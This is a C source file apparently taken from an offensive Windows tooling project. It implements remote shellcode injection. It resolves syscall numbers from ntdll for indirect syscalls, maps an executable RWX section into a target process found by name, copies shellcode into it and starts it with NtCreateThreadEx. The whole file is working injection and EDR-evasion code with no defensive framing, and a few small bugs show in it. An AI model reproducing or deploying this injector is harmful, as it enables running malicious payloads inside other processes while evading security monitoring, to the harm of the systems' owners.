#include "Box.h"

#pragma comment (lib, "OneCore.lib")


VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT DWORD* FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}


BOOL RemoteMapInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	OUT PVOID* pAddress
)

{

	BOOL State = TRUE;
	HANDLE hFile = NULL, hSection = NULL;
	PVOID MLocalAddress = NULL, MRemoteAddress = NULL;
	SIZE_T size = sShellSize;
	PLARGE_INTEGER maxSize = { size };
	HMODULE ntdll = NULL;
	NTSTATUS STATUS = NULL;
	PVOID localaddress = NULL, remoteaddress = NULL;


	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL)
	{
		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
		return FALSE;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);


	IDSC(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
	IDSC(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
	IDSC(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);


	STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtCreateSection Handle", hSection);
	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);


	STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
	INFO("Current Protection--[RWX]  Current Size Allocated--[%zu--Bytes]", sShellSize);

	STATUS = NtMapViewOfSection(hSection, hProcess, &remoteaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created For a Remote Process!", remoteaddress);

	memcpy(localaddress, sShellcode, sShellSize);

	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteaddress, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Successfully Created a Thread!", hThread);


CLEANUP:

	if (hFile)
		CloseHandle(hFile);
	return State;

}


BOOL GetRemoteProcessHandle
(
	IN LPCWSTR szProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;
	HMODULE							ntdll = NULL;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);

	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL)
	{
		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
		return FALSE;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	IDSC(ntdll, "NtQuerySystemInformation", &fn_NtQuerySystemInformationSSN, &fn_NtQuerySystemInformationSyscall);
	IDSC(ntdll, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);



	NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! Reason: %lu", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Allocated Heap into the System Process Information!");

	pValueToFree = SystemProcInfo;


	STATUS = NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQuerySystemInformation Failed! Reason: 0x%0.8x", STATUS);
		return FALSE;
	}


	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{

			ULONG_PTR foundPid = (ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*PID = (DWORD)foundPid;

			CLIENT_ID CID;
			CID.UniqueProcess = (HANDLE)foundPid;
			CID.UniqueThread = NULL;

			STATUS = NtOpenProcess(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS)
			{
				WARN("NtOpenProcess Failed! Reason: 0x%0.8x", STATUS);
				return FALSE;
			}
			break;

		}

		if (!SystemProcInfo->NextEntryOffset)
		{
			break;
		}


		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}



	if (pValueToFree)
		HeapFree(GetProcessHeap(), 0, pValueToFree);

	// check numeric PID and handle
	if (*PID == 0 || *hProcess == NULL)
		return FALSE;

	return TRUE;
}